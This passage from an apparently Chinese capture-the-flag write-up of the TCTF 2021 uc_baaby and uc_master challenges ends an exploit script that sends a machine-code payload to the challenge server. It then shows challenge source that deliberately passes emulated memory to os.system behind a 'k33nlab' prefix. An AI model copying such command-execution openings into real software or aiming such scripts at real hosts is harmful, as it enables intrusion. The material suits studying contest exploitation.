<span class="hljs-number">0x05</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x0C</span>]<br><br><br>code = bytes(code)<br>code = code<span class="hljs-number">.</span>rjust(<span class="hljs-number">0x2000</span>, b<span class="hljs-string">&#x27;\x66&#x27;</span>)<br>print(<span class="hljs-string">&quot;code len:&quot;</span>, hex(len(code)))<br>p = remote(<span class="hljs-string">&#x27;111.186.59.29&#x27;</span>, <span class="hljs-number">10086</span>)<br>p<span class="hljs-number">.</span>send(code)<br>p<span class="hljs-number">.</span>interactive()<br></code></pre></td></tr></table></figure><h2 id="uc-master"><a href="#uc-master" class="headerlink" title="uc_master"></a>uc_master</h2><p>题目下载:  <a href="/2021/07/06/TCTF2021-uc-master-uc-baaby-FEA/uc_masteeer.zip" title="uc_masteeer.zip">uc_masteeer.zip</a></p><p>题目代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> types<br><span class="hljs-keyword">from</span> unicorn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> unicorn.x86_const <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> syscall <span class="hljs-keyword">import</span> hook_syscall<br><br><br>CODE = <span class="hljs-number">0xdeadbeef000</span><br>STACK = <span class="hljs-number">0xbabecafe000</span><br>MAIN = <span class="hljs-string">b&#x27;\x48\x83\xec\x20\x66\xc7\x44\x24\x0e\x00\x00\x48\x8d\x5c\x24\x0e\x48\xc7\x44\x24\x10\x00\x00\x00\x00\x48\xc7\x44\x24\x18\x00\x00\x00\x00\xb9\x44\x00\x00\x00\x48\x8d\x15\x8b\x01\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\xbe\x01\x00\x00\xb9\x02\x00\x00\x00\x48\x89\xda\x31\xf6\x31\xff\x31\xc0\xe8\xab\x01\x00\x00\x8a\x44\x24\x0e\x3c\x32\x74\x39\x3c\x33\x74\x62\x3c\x31\x0f\x85\x04\x01\x00\x00\xb9\x12\x00\x00\x00\x48\x8d\x15\x35\x01\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x7a\x01\x00\x00\x48\x83\xc4\x20\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x27\xb9\x12\x00\x00\x00\x48\x8d\x15\xf6\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x4d\x01\x00\x00\x48\x83\xc4\x20\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x27\xb9\x07\x00\x00\x00\x48\x8d\x15\xc2\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\x20\x01\x00\x00\x31\xf6\x31\xff\x48\x8d\x54\x24\x10\xb9\x08\x00\x00\x00\x31\xc0\xe8\x0b\x01\x00\x00\xb9\x07\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\x48\x8d\x15\x82\x00\x00\x00\xbf\x01\x00\x00\x00\xe8\xee\x00\x00\x00\x31\xf6\x31\xff\x31\xc0\x48\x8d\x54\x24\x18\xb9\x08\x00\x00\x00\xe8\xd9\x00\x00\x00\x48\x81\x7c\x24\x18\xff\x00\x00\x00\x0f\x87\xef\xfe\xff\xff\xb9\x07\x00\x00\x00\x48\x8d\x15\x41\x00\x00\x00\xbe\x01\x00\x00\x00\x31\xc0\xbf\x01\x00\x00\x00\xe8\xad\x00\x00\x00\x48\x8b\x4c\x24\x18\x31\xf6\x31\xff\x48\x8b\x54\x24\x10\x31\xc0\xe8\x98\x00\x00\x00\xe9\xb8\xfe\xff\xff\xbe\xff\x00\x00\x00\xbf\x3c\x00\x00\x00\x31\xc0\xe8\x82\x00\x00\x00\xe9\xa2\xfe\xff\xff\x64\x61\x74\x61\x3a\x20\x00\x73\x69\x7a\x65\x3a\x20\x00\x61\x64\x64\x72\x3a\x20\x00\x50\x61\x74\x68\x65\x74\x69\x63\x20\x68\x75\x6d\x61\x6e\x20\x3e\x0a\x00\x50\x6f\x77\x65\x72\x66\x75\x6c\x20\x61\x64\x6d\x69\x6e\x20\x3e\x0a\x00\x57\x65\x6c\x63\x6f\x6d\x65\x20\x74\x6f\x20\x75\x63\x5f\x6d\x61\x73\x74\x65\x65\x65\x72\x0a\x31\x2e\x20\x61\x64\x6d\x69\x6e\x20\x74\x65\x73\x74\x0a\x32\x2e\x20\x75\x73\x65\x72\x20\x74\x65\x73\x74\x0a\x33\x2e\x20\x70\x61\x74\x63\x68\x20\x64\x61\x74\x61\x0a\x3f\x3a\x20\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3&#x27;</span><br>TAIL = <span class="hljs-string">b&#x27;\x31\xc0\xb9\x32\x00\x00\x00\x48\x8d\x15\x55\x00\x00\x00\xbe\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x83\xec\x18\x66\x89\x44\x24\x0e\x31\xc0\xe8\x6d\x00\x00\x00\x31\xf6\x31\xff\x31\xc0\x48\x8d\x54\x24\x0e\xb9\x02\x00\x00\x00\xe8\x58\x00\x00\x00\x80\x7c\x24\x0e\x79\x75\x11\x48\x83\xc4\x18\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x10\x31\xf6\xbf\x3c\x00\x00\x00\x31\xc0\xe8\x32\x00\x00\x00\x43\x6f\x6e\x67\x72\x61\x74\x75\x6c\x61\x74\x69\x6f\x6e\x73\x21\x20\x54\x65\x73\x74\x20\x73\x75\x63\x63\x65\x65\x64\x21\x0a\x54\x72\x79\x20\x61\x67\x61\x69\x6e\x3f\x20\x28\x79\x2f\x5b\x6e\x5d\x29\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3&#x27;</span><br>ADMIN = <span class="hljs-string">b&#x27;\xb9\x10\x00\x00\x00\x48\x8d\x15\x37\x00\x00\x00\x31\xc0\xbe\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x48\x83\xec\x08\xe8\x5f\x00\x00\x00\x48\x8d\x05\x2b\x00\x00\x00\x48\xa3\x33\xe2\xaf\xec\xab\x0b\x00\x00\x48\x83\xc4\x08\x48\xbf\x00\xe0\xaf\xec\xab\x0b\x00\x00\xff\x67\x08\x49\x6d\x61\x67\x69\x6e\x61\x74\x69\x6f\x6e\x20\x69\x73\x20\x00\x6b\x33\x33\x6e\x6c\x61\x62\x65\x63\x68\x6f\x20\x27\x6d\x6f\x72\x65\x20\x69\x6d\x70\x6f\x72\x74\x61\x6e\x74\x20\x74\x68\x61\x6e\x20\x6b\x6e\x6f\x77\x6c\x65\x64\x67\x65\x2e\x27\x00\x48\x89\xf8\x48\x89\xf7\x48\x89\xd6\x48\x89\xca\x4d\x89\xc2\x4d\x89\xc8\x4c\x8b\x4c\x24\x08\x0f\x05\xc3&#x27;</span>.ljust(<span class="hljs-number">0x1000</span>, <span class="hljs-string">b&#x27;\xf4&#x27;</span>)<br>admin_offset = CODE + <span class="hljs-number">0x6b</span> - <span class="hljs-number">5</span><br>writable = []<br>is_admin = <span class="hljs-literal">False</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">admin_hook</span>(<span class="hljs-params">uc, address, size, user_data</span>):</span><br>    <span class="hljs-keyword">global</span> is_admin<br>    is_admin = <span class="hljs-literal">True</span><br>    uc.mem_write(CODE + <span class="hljs-number">0x1000</span>, ADMIN)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hook_mem_access</span>(<span class="hljs-params">uc, access, address, size, value, user_data</span>):</span><br>    <span class="hljs-keyword">global</span> is_admin<br>    <span class="hljs-keyword">if</span> is_admin <span class="hljs-keyword">and</span> address == <span class="hljs-number">0xbabecafe233</span>:<br>        is_admin = <span class="hljs-literal">False</span><br>        cmd = uc.mem_read(value, <span class="hljs-number">0x100</span>)<br>        <span class="hljs-keyword">if</span> cmd.startswith(<span class="hljs-string">b&#x27;k33nlab&#x27;</span>):<br>            os.system(cmd[<span class="hljs-number">7</span>:cmd.index(<span class="hljs-number">0</span>)].decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_safe_mem_write</span>(<span class="hljs-params">self, address, data</span>):</span><br>    end = address + <span class="hljs-built_in">len</span>(data)<br>    <span class="hljs-keyword">for</span> page <span class="hljs-keyword">in</span> writable:<br>        <span class="hljs-keyword">if</span> address &gt;= page <span class="hljs-keyword">and</span> end &lt;= page + <span class="hljs-number">0x1000</span>:<br>            self.mem_write(address, data)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> UcError(UC_ERR_WRITE_PROT)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">p64</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">return</span> struct.pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, 